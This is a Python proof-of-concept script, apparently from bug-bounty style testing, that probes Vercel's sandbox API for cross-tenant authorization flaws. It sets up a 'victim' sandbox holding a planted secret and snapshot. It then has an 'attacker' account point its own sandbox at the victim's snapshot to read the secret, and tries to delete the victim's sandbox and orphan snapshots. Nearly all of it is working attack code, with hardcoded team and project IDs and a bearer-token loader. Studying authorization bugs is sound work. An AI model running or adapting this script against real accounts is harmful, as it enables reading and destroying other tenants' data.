# -*- coding: utf-8 -*-
"""v54b: PATCH currentSnapshotId + deleteOrphanSnapshots 跨租户决定性测试
P1: attacker PATCH 自己 sandbox currentSnapshotId=victim 快照 → resume 能否恢复 victim 数据
P2: attacker DELETE victim sandbox + deleteOrphanSnapshots=true → victim 快照是否被删"""
import base64, json, sys, time, urllib.request, urllib.error, re
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TOKEN, TEAM, PROJ

TEAM_V = 'team_jnske5hDpDfj9eDG2PAfDqWf'
PROJ_V = 'prj_LX0QDsEAlWA0uRZvVTunSef3lllF'

def load_token(p):
    raw = open(p, encoding='utf-8', errors='replace').read()
    m = re.search(r'authorization=\s*Bearer\s+(\S+)', raw, re.I) or re.search(r'Bearer\s+(\S+)', raw)
    if not m:
        for line in raw.splitlines():
            line = line.strip()
            if line and not line.startswith('#') and len(line) > 20:
                return line
    return m.group(1)

TOK_V = load_token(r'F:\scan\vercel_cookies2.txt')

def api_tok(tok, method, path, body=None, timeout=180, maxlen=400000):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + tok)
    req.add_header('Content-Type', 'application/json')
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode(errors='replace')[:maxlen]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:maxlen]
    except Exception as e:
        return -1, 'EXC %s' % str(e)[:120]

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

NAME_A = 'v54atk'
NAME_V = 'v54vic'

if __name__ == '__main__':
    api_tok(TOK_V, 'DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME_V, TEAM_V, PROJ_V))
    api_tok(TOKEN, 'DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME_A, TEAM, PROJ))
    time.sleep(2)

    # ===== victim 侧：建 sandbox + marker + 快照 =====
    c, r = api_tok(TOK_V, 'POST', '/v4/sandboxes?teamId=%s' % TEAM_V, {"projectId": PROJ_V, "name": NAME_V})
    if c != 200:
        print('victim create failed', r[:200], flush=True)
        sys.exit(1)
    vsid = json.loads(r)['sandbox']['currentSessionId']
    print('victim sid =', vsid, flush=True)
    time.sleep(8)
    c1, r1 = api_tok(TOK_V, 'POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (vsid, TEAM_V),
                     {"command": "bash", "args": ["-c", "echo V54-VICTIM-SECRET > /tmp/v54_victim.txt && cat /tmp/v54_victim.txt"],
                      "wait": True, "logs": True, "timeout": 30000}, timeout=120)
    print('[victim marker] -> %d' % c1, flush=True)
    print(parse_data(r1).strip(), flush=True)
    c2, r2 = api_tok(TOK_V, 'POST', '/v2/sandboxes/sessions/%s/snapshot?teamId=%s' % (vsid, TEAM_V), {})
    print('[victim snapshot] -> %d %s' % (c2, r2[:150]), flush=True)
    if c2 != 201:
        print('snapshot failed, abort', flush=True)
        sys.exit(1)
    snap_v = json.loads(r2)['snapshot']['id']
    print('snap_v =', snap_v, flush=True)
    time.sleep(5)

    # ===== attacker 侧：建 sandbox =====
    c3, r3 = api_tok(TOKEN, 'POST', '/v4/sandboxes?teamId=%s' % TEAM, {"projectId": PROJ, "name": NAME_A})
    if c3 != 200:
        print('attacker create failed', r3[:200], flush=True)
        sys.exit(1)
    asid = json.loads(r3)['sandbox']['currentSessionId']
    print('attacker sid =', asid, flush=True)
    time.sleep(8)

    # P1: PATCH 自己 sandbox currentSnapshotId = victim 快照
    c4, r4 = api_tok(TOKEN, 'PATCH', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME_A, TEAM, PROJ),
                     {"currentSnapshotId": snap_v})
    print('[P1 PATCH currentSnapshotId=victim snap] -> %d %s' % (c4, r4[:300]), flush=True)

    # 若 200 → resume → 检查 victim marker
    if c4 == 200:
        c5, r5 = api_tok(TOKEN, 'GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s&resume=true' % (NAME_A, TEAM, PROJ))
        print('[P1 resume] -> %d' % c5, flush=True)
        nsid = None
        if c5 == 200:
            nsid = json.loads(r5)['sandbox'].get('currentSessionId')
            print('new sid =', nsid, flush=True)
        time.sleep(8)
        if nsid:
            c6, r6 = api_tok(TOKEN, 'POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (nsid, TEAM),
                             {"command": "bash", "args": ["-c", "cat /tmp/v54_victim.txt 2>&1 || echo NO-VICTIM-DATA"],
                              "wait": True, "logs": True, "timeout": 30000}, timeout=120)
            print('[P1 marker check] -> %d' % c6, flush=True)
            print(parse_data(r6).strip(), flush=True)

    # P2: attacker DELETE victim sandbox + deleteOrphanSnapshots=true
    c7, r7 = api_tok(TOKEN, 'DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s&deleteOrphanSnapshots=true' % (NAME_V, TEAM_V, PROJ_V))
    print('[P2 DELETE victim+orphan] -> %d %s' % (c7, r7[:200]), flush=True)
    time.sleep(3)
    # victim 验证快照是否还在
    c8, r8 = api_tok(TOK_V, 'GET', '/v2/sandboxes/snapshots/%s?teamId=%s' % (snap_v, TEAM_V))
    print('[P2 victim snap check] -> %d %s' % (c8, r8[:150]), flush=True)

    # 清理
    api_tok(TOKEN, 'DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME_A, TEAM, PROJ))
    if c8 == 200:
        api_tok(TOK_V, 'DELETE', '/v2/sandboxes/snapshots/%s?teamId=%s' % (snap_v, TEAM_V))
    api_tok(TOK_V, 'DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME_V, TEAM_V, PROJ_V))
    print('DONE', flush=True)
